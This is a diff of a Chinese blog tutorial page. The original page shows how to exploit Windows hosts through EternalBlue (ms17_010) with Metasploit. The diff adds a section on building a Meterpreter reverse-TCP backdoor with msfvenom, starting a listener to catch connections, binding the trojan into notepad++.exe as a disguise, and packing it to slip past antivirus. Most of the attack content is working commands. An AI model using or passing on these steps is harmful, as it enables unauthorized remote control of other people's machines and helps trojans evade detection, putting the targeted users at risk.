@@ -27,8 +27,10 @@
 <meta property="og:description" content="Metasploit 攻击永恒之蓝全流程一、流程概述利用 Metasploit 框架，通过永恒之蓝（ms17_010_eternalblue ）漏洞对目标 Windows 主机实施攻击，获取 Meterpreter 会话，实现后渗透测试，需合理配置攻击模块参数，涵盖目标与攻击方网络信息、攻击载荷等 。 二、具体步骤（一）选择攻击模块在 Metasploit 中，调用永恒之蓝漏洞对应的攻击模块，命令">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/68a48e8058cb8da5c83a622c.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/68a8074e58cb8da5c8425e3c.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/68a807c158cb8da5c8425e70.png">
 <meta property="article:published_time" content="2025-08-19T07:59:08.000Z">
-<meta property="article:modified_time" content="2025-08-19T14:47:42.183Z">
+<meta property="article:modified_time" content="2025-08-22T06:01:55.333Z">
 <meta property="article:author" content="suny">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://pic1.imgdb.cn/item/68a48e8058cb8da5c83a622c.png">
@@ -252,7 +254,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          396 字
+          849 字
         
       </span>
     
@@ -263,7 +265,7 @@
         
         
         
-          4 分钟
+          8 分钟
         
       </span>
     
@@ -305,7 +307,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年8月19日 晚上
+                    本文最后更新于 2025年8月22日 下午
                   
                 
               </p>
@@ -318,11 +320,11 @@
 <figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> exploit/windows/smb/ms17_010_eternalblue<br></code></pre></td></tr></table></figure>
 <p>该模块针对 Windows SMB 服务，利用永恒之蓝漏洞发起攻击 。  </p>
 <h3 id="（二）查看并配置必选项"><a href="#（二）查看并配置必选项" class="headerlink" title="（二）查看并配置必选项"></a>（二）查看并配置必选项</h3><ol>
-<li><p><strong>查看必选参数</strong><br>  输入 <code>show options</code> 命令，筛选 <code>required</code> 为 <code>yes</code> 的配置项，明确需手动设置的参数，确保攻击流程完整 。  </p>
+<li><p><strong>查看必选参数</strong><br> 输入 <code>show options</code> 命令，筛选 <code>required</code> 为 <code>yes</code> 的配置项，明确需手动设置的参数，确保攻击流程完整 。  </p>
 </li>
-<li><p><strong>设置目标主机（RHOSTS）</strong><br>  命令：<code>set RHOSTS 192.168.1.128</code><br>  说明：<code>RHOSTS</code> 定义攻击目标，填写目标 Windows 主机的 IP 地址，指定要渗透的对象 。  </p>
+<li><p><strong>设置目标主机（RHOSTS）</strong><br> 命令：<code>set RHOSTS 192.168.1.128</code><br> 说明：<code>RHOSTS</code> 定义攻击目标，填写目标 Windows 主机的 IP 地址，指定要渗透的对象 。  </p>
 </li>
-<li><p><strong>设置攻击载荷（Payload）</strong><br>  命令：<code>set payload windows/x64/meterpreter/reverse_tcp</code><br>  说明：<code>payload</code> 决定攻击成功后的行为，选择此载荷可获取 <code>meterpreter</code> 交互环境，它是 Metasploit 后渗透阶段的核心工具，支持文件操作、权限提升等多种渗透动作 。</p>
+<li><p><strong>设置攻击载荷（Payload）</strong><br> 命令：<code>set payload windows/x64/meterpreter/reverse_tcp</code><br> 说明：<code>payload</code> 决定攻击成功后的行为，选择此载荷可获取 <code>meterpreter</code> 交互环境，它是 Metasploit 后渗透阶段的核心工具，支持文件操作、权限提升等多种渗透动作 。</p>
 </li>
 </ol>
 <p>  <img src="https://pic1.imgdb.cn/item/68a48e8058cb8da5c83a622c.png" srcset="/img/loading.gif" lazyload></p>
@@ -333,6 +335,34 @@
 </ul>
 </li>
 </ol>
+<h1 id="使用Kali生成远控木马及免杀"><a href="#使用Kali生成远控木马及免杀" class="headerlink" title="使用Kali生成远控木马及免杀"></a>使用Kali生成远控木马及免杀</h1><h2 id="一、生成远控木马流程"><a href="#一、生成远控木马流程" class="headerlink" title="一、生成远控木马流程"></a>一、生成远控木马流程</h2><h3 id="（一）利用msfvenom生成后门程序"><a href="#（一）利用msfvenom生成后门程序" class="headerlink" title="（一）利用msfvenom生成后门程序"></a>（一）利用msfvenom生成后门程序</h3><p><code>msfvenom</code> 用于生成后门，在目标机执行后，本地监听可实现远控 ，在shell环境使用，而非<code>msfconsole</code>终端。<br>命令格式（Windows可执行程序后门）：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p [payload] lhost=[本地IP] lport=[本地端口] -f [输出格式] -o [输出文件名]<br></code></pre></td></tr></table></figure>
+<p>示例：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.123.136 lport=9999 -f exe -o demo.exe<br></code></pre></td></tr></table></figure>
+<p>参数解析：  </p>
+<ul>
+<li><code>payload</code> ：如<code>windows/x64/meterpreter/reverse_tcp</code> ，指定系统、架构、作用方式  </li>
+<li><code>lhost</code> ：本地监听IP，即攻击者机器IP  </li>
+<li><code>lport</code> ：本地监听端口，自定义设置  </li>
+<li><code>f</code> ：输出文件格式，<code>exe</code> 对应Windows可执行文件  </li>
+<li><code>o</code> ：设置输出文件名</li>
+</ul>
+<p><img src="https://pic1.imgdb.cn/item/68a8074e58cb8da5c8425e3c.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="（二）开启监听等待上线"><a href="#（二）开启监听等待上线" class="headerlink" title="（二）开启监听等待上线"></a>（二）开启监听等待上线</h3><p>在<code>msfconsole</code>中操作，用于监听目标机连接：  </p>
+<ol>
+<li>选择模块：<code>use exploit/multi/handler</code>  </li>
+<li>设置payload：<code>set payload windows/x64/meterpreter/reverse_tcp</code>  </li>
+<li>配置本地IP：<code>set lhost 192.168.123.136</code>（与生成木马时一致 ）  </li>
+<li>配置监听端口：<code>set lport 9999</code>（与生成木马时一致 ）  </li>
+<li>启动监听：<code>run</code></li>
+</ol>
+<p><img src="https://pic1.imgdb.cn/item/68a807c158cb8da5c8425e70.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="二、免杀处理（躲避杀毒软件查杀）"><a href="#二、免杀处理（躲避杀毒软件查杀）" class="headerlink" title="二、免杀处理（躲避杀毒软件查杀）"></a>二、免杀处理（躲避杀毒软件查杀）</h2><h3 id="（一）捆绑木马"><a href="#（一）捆绑木马" class="headerlink" title="（一）捆绑木马"></a>（一）捆绑木马</h3><p>将木马与正常程序捆绑，伪装降低查杀概率。<br>命令格式：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[本地IP] lport=[本地端口] -f exe -x [正常程序路径] -o [输出文件名]<br></code></pre></td></tr></table></figure>
+<p>示例：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.136 lport=9999 -f exe -x notepad++.exe -o notepad++.exe<br></code></pre></td></tr></table></figure>
+<p><code>-x</code> 参数用于指定捆绑的正常程序（如系统常见的<code>notepad++.exe</code> ）  </p>
+<h3 id="（二）加壳免杀"><a href="#（二）加壳免杀" class="headerlink" title="（二）加壳免杀"></a>（二）加壳免杀</h3><p>通过加压缩壳、加密壳等方式修改程序特征，躲避查杀。不同杀毒软件检测逻辑不同，需自行测试效果，如部分加壳后可通过“火绒安全”病毒查杀（显示“本次扫描未发现风险” ） ，常见加壳工具可辅助实现压缩壳、加密壳添加操作。 </p>
 
                 
               </div>
